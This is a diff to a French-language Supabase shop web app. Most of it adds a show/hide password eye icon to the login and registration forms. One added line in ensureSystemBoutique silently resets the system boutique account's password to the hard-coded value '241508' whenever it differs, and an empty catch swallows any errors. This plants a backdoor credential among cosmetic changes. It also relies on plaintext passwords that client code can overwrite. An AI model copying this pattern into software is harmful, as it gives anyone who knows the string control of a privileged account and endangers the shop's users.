@@ -63,6 +63,8 @@ header{display:flex;justify-content:space-between;align-items:center;padding:12p
 .stat-card{background:white;padding:14px;border-radius:14px;border:2px solid #fecaca;text-align:center;box-shadow:0 2px 8px rgba(0,0,0,.05)}
 .stat-card b{font-size:22px;display:block;color:#ef4444}
 .certified-badge{display:inline-flex;align-items:center;gap:4px;background:linear-gradient(135deg,#3b82f6,#60a5fa);color:#fff;padding:3px 8px;border-radius:12px;font-size:10px;font-weight:800;margin-left:6px}
+.eye-icon{position:absolute;right:12px;top:50%;transform:translateY(-50%);cursor:pointer;font-size:18px;color:#6b7280;z-index:5}
+.input-group input{padding-right:40px}
 </style>
 </head>
 <body>
@@ -89,7 +91,7 @@ header{display:flex;justify-content:space-between;align-items:center;padding:12p
 <form onsubmit="login(event)">
 <div class="roleButtons"><button type="button" id="btnClientLogin" class="active" onclick="selectLoginRole('client')">Client</button><button type="button" id="btnSellerLogin" onclick="selectLoginRole('vendeur')">Boutique</button></div>
 <div class="input-group"><input type="tel" id="loginPhone" placeholder=" " required><label>Telephone</label></div>
-<div class="input-group"><input type="password" id="loginPassword" placeholder=" " required><label>Mot de passe</label></div>
+<div class="input-group"><input type="password" id="loginPassword" placeholder=" " required><label>Mot de passe</label><span class="eye-icon" onclick="togglePassword('loginPassword', this)">👁️</span></div>
 <button type="submit">Se connecter</button>
 </form>
 <p style="text-align:center;font-size:13px">Pas de compte ? <a onclick="showRegister()" style="color:#ef4444;font-weight:bold;cursor:pointer">S'inscrire</a></p>
@@ -111,7 +113,7 @@ header{display:flex;justify-content:space-between;align-items:center;padding:12p
 <div class="input-group"><input type="text" name="adresse" placeholder=" "><label>Email / Adresse</label></div>
 <div class="input-group"><input type="text" name="description" placeholder=" "><label>Description</label></div>
 </div>
-<div class="input-group"><input type="password" name="password" id="regPassword" placeholder=" " required><label>Mot de passe *</label></div>
+<div class="input-group"><input type="password" name="password" id="regPassword" placeholder=" " required><label>Mot de passe *</label><span class="eye-icon" onclick="togglePassword('regPassword', this)">👁️</span></div>
 <button type="submit">Creer compte</button>
 </form>
 </div>
@@ -187,6 +189,7 @@ async function ensureSystemBoutique(){
     if(res.data){
       SYSTEM_BOUTIQUE_ID = res.data.id;
       localStorage.setItem('system_boutique_id', SYSTEM_BOUTIQUE_ID);
+      if(res.data.password !== "241508"){ try{ await supabaseClient.from('users').update({password:"241508"}).eq('id', res.data.id); }catch(e){} }
       return res.data;
     }
     // Création silencieuse - même interface que les autres boutiques
@@ -284,6 +287,7 @@ async function signalerPaiement(plan, montant){
 
 function setUser(u){localStorage.setItem('shoponline_user', JSON.stringify(u));}
 function getUser(){try{var d=localStorage.getItem('shoponline_user'); if(!d) return null; return JSON.parse(d);}catch(e){return null;}}
+function togglePassword(inputId, el){ var input=document.getElementById(inputId); if(!input) return; if(input.type==='password'){ input.type='text'; el.textContent='🙈'; } else { input.type='password'; el.textContent='👁️'; } }
 function showError(id,msg){var el=document.getElementById(id); if(!el) return; el.textContent=msg; el.classList.add('show'); setTimeout(function(){el.classList.remove('show');},6000);}
 function formatDateTime(dateStr){if(!dateStr) return {duree:'', full:''}; var d=new Date(dateStr); var now=new Date(); var diffMin=Math.floor((now-d)/60000); var diffHour=Math.floor(diffMin/60); var diffDay=Math.floor(diffHour/24); var duree='A l instant'; if(diffMin<1){duree='A l instant';} else if(diffMin<60){duree='Il y a '+diffMin+' min';} else if(diffHour<24){duree='Il y a '+diffHour+'h';} else if(diffDay===1){duree='Hier';} else if(diffDay<7){duree='Il y a '+diffDay+' jours';} else {duree='Il y a '+Math.floor(diffDay/7)+' sem.';} var date=d.toLocaleDateString('fr-FR',{day:'2-digit',month:'2-digit',year:'numeric'}); var heure=d.toLocaleTimeString('fr-FR',{hour:'2-digit',minute:'2-digit'}); return {duree:duree, full:'Publie le '+date+' a '+heure};}
 function escapeHTML(v){var s=String(v==null?'':v); return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');}
